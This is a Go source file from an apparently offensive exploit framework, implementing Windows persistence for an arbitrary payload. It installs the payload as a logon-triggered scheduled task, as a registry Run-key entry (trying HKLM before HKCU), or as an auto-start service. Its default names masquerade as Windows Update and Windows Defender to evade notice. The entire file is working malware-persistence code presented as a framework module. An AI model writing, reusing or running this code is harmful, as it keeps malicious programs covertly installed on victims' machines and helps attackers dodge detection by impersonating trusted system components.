//go:build windows

package persist

import (
	"context"
	"fmt"
	"os/exec"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"golang.org/x/sys/windows/registry"
)

func persistSchTask(_ context.Context, cfg *pb.PersistConfig) (*pb.PersistResult, error) {
	name := cfg.Name
	if name == "" {
		name = "WindowsUpdate"
	}

	payloadPath := cfg.PayloadPath
	if payloadPath == "" {
		return nil, fmt.Errorf("payload_path required for schtask persistence")
	}

	trigger := cfg.Trigger
	if trigger == "" {
		trigger = "ONLOGON"
	}

	args := []string{
		"/Create",
		"/TN", name,
		"/TR", payloadPath,
		"/SC", trigger,
		"/F",
	}

	cmd := exec.Command("schtasks.exe", args...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("schtasks.exe: %s (%w)", string(output), err)
	}

	return &pb.PersistResult{
		Success: true,
		Method:  "schtask",
		Details: fmt.Sprintf("task '%s' created with trigger %s -> %s", name, trigger, payloadPath),
	}, nil
}

func persistRegistry(_ context.Context, cfg *pb.PersistConfig) (*pb.PersistResult, error) {
	name := cfg.Name
	if name == "" {
		name = "WindowsDefenderUpdate"
	}

	payloadPath := cfg.PayloadPath
	if payloadPath == "" {
		return nil, fmt.Errorf("payload_path required for registry persistence")
	}

	// Try HKLM first, fall back to HKCU
	regPath := `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, regPath, registry.SET_VALUE)
	keyRoot := "HKLM"
	if err != nil {
		key, err = registry.OpenKey(registry.CURRENT_USER, regPath, registry.SET_VALUE)
		keyRoot = "HKCU"
		if err != nil {
			return nil, fmt.Errorf("open Run key: %w", err)
		}
	}
	defer key.Close()

	if err := key.SetStringValue(name, payloadPath); err != nil {
		return nil, fmt.Errorf("set registry value: %w", err)
	}

	return &pb.PersistResult{
		Success: true,
		Method:  "registry",
		Details: fmt.Sprintf("%s\\%s\\%s = %s", keyRoot, regPath, name, payloadPath),
	}, nil
}

func persistService(_ context.Context, cfg *pb.PersistConfig) (*pb.PersistResult, error) {
	name := cfg.Name
	if name == "" {
		name = "WindowsDefenderSvc"
	}

	payloadPath := cfg.PayloadPath
	if payloadPath == "" {
		return nil, fmt.Errorf("payload_path required for service persistence")
	}

	// Use sc.exe to create the service
	cmd := exec.Command("sc.exe", "create", name,
		"binPath=", payloadPath,
		"start=", "auto",
		"DisplayName=", "Windows Defender Service")
	output, err := cmd.CombinedOutput()
	if err != nil {
		return nil, fmt.Errorf("sc.exe create: %s (%w)", string(output), err)
	}

	return &pb.PersistResult{
		Success: true,
		Method:  "service",
		Details: fmt.Sprintf("service '%s' created with auto start -> %s", name, payloadPath),
	}, nil
}
